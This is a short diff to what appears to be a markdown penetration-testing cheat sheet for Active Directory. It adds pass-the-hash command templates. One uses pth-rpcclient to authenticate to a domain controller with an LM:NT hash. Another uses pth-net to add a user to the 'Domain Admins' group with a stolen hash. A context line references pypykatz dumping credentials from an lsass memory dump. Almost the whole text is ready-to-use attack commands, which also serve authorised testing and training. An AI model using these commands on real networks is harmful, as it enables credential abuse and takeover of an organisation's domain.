@@ -860,6 +860,22 @@ pypykatz lsa minidump lsass.DMP
 </details> 
 
 <details>
+  <summary> pth-rpcclient </summary> 
+
+  ```shell
+  pth-rpcclient -U <AD_domain>/<username>%<hash[LM:NT]> <Domain_Controller_IP>
+  ```
+</details> 
+
+<details>
+  <summary> pth-net add new domain admin </summary> 
+
+  ```shell
+  pth-net rpc group addmem "Domain Admins" <username> -U <AD_domain>/<username>%<hash[LM:NT]> -S <Domain_Controller_IP>
+  ```
+</details> 
+
+<details>
   <summary> Command to add a new Domain Admin </summary> 
   
   #### Create the new user
